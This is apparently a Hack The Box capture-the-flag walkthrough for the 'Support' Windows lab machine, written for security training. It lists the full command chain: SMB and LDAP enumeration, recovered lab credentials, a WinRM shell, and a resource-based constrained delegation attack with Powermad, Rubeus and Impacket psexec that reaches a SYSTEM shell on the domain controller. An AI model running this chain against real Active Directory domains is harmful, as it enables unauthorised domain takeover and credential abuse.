# Support - HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Support-green?logo=hackthebox)](https://app.hackthebox.com/machines/484)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)](https://github.com/subhash00/HTB_Labs/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/subhash00/HTB_Labs/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

This writeup covers the full exploitation of the Support machine on Hack The Box, which involves enumerating SMB shares, reverse engineering a .NET executable to extract LDAP credentials, performing LDAP enumeration, gaining a foothold via WinRM, and escalating privileges using a Resource-Based Constrained Delegation (RBCD) attack to compromise the Domain Controller as Administrator.

---

## Table of Contents

- [Enumeration and Initial Access](#enumeration-and-initial-access)  
- [Reverse Engineering and Credential Extraction](#reverse-engineering-and-credential-extraction)  
- [LDAP Interaction and Foothold](#ldap-interaction-and-foothold)  
- [Active Directory Enumeration and Relationship Mapping](#active-directory-enumeration-and-relationship-mapping)  
- [Privilege Escalation via Resource-Based Constrained Delegation (RBCD)](#privilege-escalation-via-resource-based-constrained-delegation-rbcd)  
- [Kerberos Ticket Forging with Rubeus](#kerberos-ticket-forging-with-rubeus)  
- [Ticket Conversion and Getting SYSTEM Shell](#ticket-conversion-and-getting-system-shell)  
- [Stepwise PoC](#stepwise-poc)
- [Tools Summary](#tools-summary)

---

## Enumeration and Initial Access

**Scan all ports at high speed to detect open services**

`ports=$(nmap -p- --min-rate=1000 -T4 10.129.125.233 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`

**Scan the discovered ports with default scripts and service detection**

`nmap -p$ports -sC -sV 10.129.125.233`

**List available SMB shares**

`smbclient -L \10.129.125.233\`

**Connect anonymously to 'support-tools' SMB share**

`smbclient \10.129.241.189\support-tools`

**List files in the share**

`dir`

**Download UserInfo.exe.zip for analysis**

`get UserInfo.exe.zip`

**Extract the downloaded archive**

`unzip UserInfo.exe.zip`

**Download ILSpy to reverse engineer .NET executable**

```
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
```
---

## Reverse Engineering and Credential Extraction

**Decrypt the password using a Python script (PassDecoder.py)**
```
python3 PassDecoder.py
Output:
Username: ldap@support.htb
Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
**Add hostname mapping for LDAP resolution**

`echo '10.129.113.162 support.htb' | sudo tee -a /etc/hosts`

---

## LDAP Interaction and Foothold

- Connect with Apache Directory Studio using extracted credentials:

  - Username: `support`  
  - Password: `Ironside47pleasure40Watchful`

- Remote shell to the machine via WinRM:
`evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb`

- Query domain information and group memberships:

```
Get-ADDomain
whoami /groups
```
- Add domain controller hostname to hosts file:
`echo '10.129.113.162 dc.support.htb' | sudo tee -a /etc/hosts`

---

## Active Directory Enumeration and Relationship Mapping

**Run BloodHound enumeration**

`bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.241.189 -c all --zip`

---

## Privilege Escalation via Resource-Based Constrained Delegation (RBCD)

**Import the PowerMad module for machine account manipulation**

`Import-Module .\Powermad.ps1`

**Add a fake computer account with a password**

`New-MachineAccount -MachineAccount FAKECOMP1 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)`

**Get details, especially the SID, of the new computer account**

`Get-ADComputer -identity FAKECOMP1`

**Configure delegation on the Domain Controller to allow the fake computer to impersonatev**

`Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKECOMP1$`

**Verify the delegation change**

`Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount`

---

## Kerberos Ticket Forging with Rubeus

**Generate the NTLM hash for the fake computer password**
```
./Rubeus.exe hash /password:Password123! /user:FAKECOMP1$ /domain:support.htb
Sample output hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
```

**Request and inject a Kerberos ticket impersonating Administrator**

`./Rubeus.exe s4u /user:FAKECOMP1$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt`

---

## Ticket Conversion and Getting SYSTEM Shell

**Remove all line breaks and spaces from the base64 ticket, save it as .b64**

`echo "BASE64_TICKET_STRING_HERE" | tr -d '\n\r ' > ticket.b64`

**Decode the base64 ticket to binary .kirbi format**

`base64 -d ticket.b64 > ticket.kirbi`

**Convert the .kirbi ticket to a .ccache file usable by Impacket**

`impacket-ticketConverter ticket.kirbi ticket.ccache`

**Use the ccache ticket with Impacket’s psexec to get SYSTEM shell on domain controller**

`KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass`

---

## 11. Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
<img width="1572" height="824" alt="32" src="https://github.com/user-attachments/assets/d4fb9f6a-aebf-4bb7-8480-af2fda02ce54" />
<img width="1114" height="465" alt="31" src="https://github.com/user-attachments/assets/8530b13d-eca8-4fbf-bcd7-c24e0aa2a334" />
<img width="1467" height="571" alt="30" src="https://github.com/user-attachments/assets/4b767b63-826f-4e11-961f-b1ff61f44cb3" />
<img width="1849" height="753" alt="29" src="https://github.com/user-attachments/assets/1cf547fc-3f03-46ac-bce9-9b23b92a2864" />
<img width="1003" height="213" alt="28" src="https://github.com/user-attachments/assets/1781f208-0130-4435-9d69-dab6578c1f41" />
<img width="952" height="810" alt="27" src="https://github.com/user-attachments/assets/b3aba4cf-6bb3-4963-91e4-428a0a175b36" />
<img width="1920" height="884" alt="26" src="https://github.com/user-attachments/assets/6c150a64-46ec-433d-abaa-0db6ffa32209" />
<img width="1920" height="897" alt="25" src="https://github.com/user-attachments/assets/9da4c318-729a-44e3-98d2-2afe0cd799aa" />
<img width="1920" height="771" alt="24" src="https://github.com/user-attachments/assets/ad6ec93d-78dc-4668-9991-f4f46ba75c46" />
<img width="676" height="404" alt="23" src="https://github.com/user-attachments/assets/2f93083a-e838-41b2-8cee-d39854d72b1e" />
<img width="423" height="51" alt="22" src="https://github.com/user-attachments/assets/ca20c601-f7c4-4cd0-9814-35c6f0ffbcc8" />
<img width="891" height="101" alt="21" src="https://github.com/user-attachments/assets/44b43841-3d26-4b03-b38e-bdc3f349a4ed" />
<img width="1169" height="822" alt="20" src="https://github.com/user-attachments/assets/5db4b74c-c89e-457f-993f-ce5f0b02869f" />
<img width="1895" height="852" alt="19" src="https://github.com/user-attachments/assets/9b8bfdcf-6133-4cd6-9669-fcefbb6b76e5" />
<img width="749" height="870" alt="18" src="https://github.com/user-attachments/assets/d9891e99-25b3-442c-adbc-e0642e7dfb22" />
<img width="1816" height="763" alt="17" src="https://github.com/user-attachments/assets/f8384c0a-f625-44e5-b2ba-f4ebddfb6c30" />
<img width="1848" height="807" alt="16" src="https://github.com/user-attachments/assets/b3e23080-366d-436a-abda-f017f0b1cb74" />
<img width="1004" height="510" alt="15" src="https://github.com/user-attachments/assets/df15d2a2-69b5-4225-a661-b6b66b99abc5" />
<img width="1178" height="815" alt="14" src="https://github.com/user-attachments/assets/81cbf54c-f800-44aa-a9be-d8f698cbf129" />
<img width="864" height="118" alt="13" src="https://github.com/user-attachments/assets/807803f7-7d65-4068-a6b8-01e36a789e67" />
<img width="1911" height="789" alt="12" src="https://github.com/user-attachments/assets/6836a971-c6df-4f28-ae04-837d2c796475" />
<img width="991" height="685" alt="11" src="https://github.com/user-attachments/assets/f558fab8-2406-4680-ad13-ece8413027f3" />
<img width="1014" height="467" alt="10" src="https://github.com/user-attachments/assets/b3d27fc1-6d23-4c5a-a9a2-ffe7fcc1fc72" />
<img width="984" height="391" alt="9" src="https://github.com/user-attachments/assets/75fc7c91-1abc-4485-9505-fdebbb4a1491" />
<img width="1365" height="507" alt="8" src="https://github.com/user-attachments/assets/96c4a2ed-64b1-4125-b520-800a183c2060" />
<img width="968" height="210" alt="7" src="https://github.com/user-attachments/assets/fb705c99-075d-4af8-b1a8-e3aa50f5a504" />
<img width="1460" height="698" alt="6" src="https://github.com/user-attachments/assets/66fa8c8c-2d3c-4a9c-8f65-7ee4593fe022" />
<img width="1897" height="780" alt="5" src="https://github.com/user-attachments/assets/bafd9087-6de3-4158-a1cb-775135fd683f" />
<img width="1092" height="838" alt="4" src="https://github.com/user-attachments/assets/6b59b6c5-e6d2-4e02-8a51-283815be340c" />
<img width="756" height="68" alt="3" src="https://github.com/user-attachments/assets/f9ad9360-f2c8-48dd-be15-81384ca5188c" />
<img width="956" height="212" alt="2" src="https://github.com/user-attachments/assets/1016e370-7442-47d2-97bb-59a6fbca1424" />
<img width="1249" height="564" alt="1" src="https://github.com/user-attachments/assets/ab04cdd3-94d2-4c7d-92a0-fc046b7e7b89" />
</details>

---

## Tools Summary

| Tool                     | Purpose                                           |
|--------------------------|--------------------------------------------------|
| `nmap`, `smbclient`      | Port and SMB share enumeration                    |
| `ldapsearch`, ApacheDS   | LDAP enumeration and user discovery               |
| `evil-winrm`             | Remote shell access over WinRM                     |
| BloodHound, SharpHound   | AD relationship and privilege graph analysis      |
| PowerMad, PowerView      | AD machine account manipulation and enumeration   |
| Rubeus                   | Kerberos ticket manipulation and forging          |
| Impacket-ticketConverter | Kerberos ticket format conversion                   |
| `impacket-psexec`        | Remote command execution with Kerberos ticket     |
| ILSpy                    | Decompile .NET executables                          |
| Wine                     | Run Windows binaries on Linux                       |

---

This walkthrough enables anyone to follow and reproduce the full exploitation of the Support HTB machine from enumeration to full domain compromise.

--- 







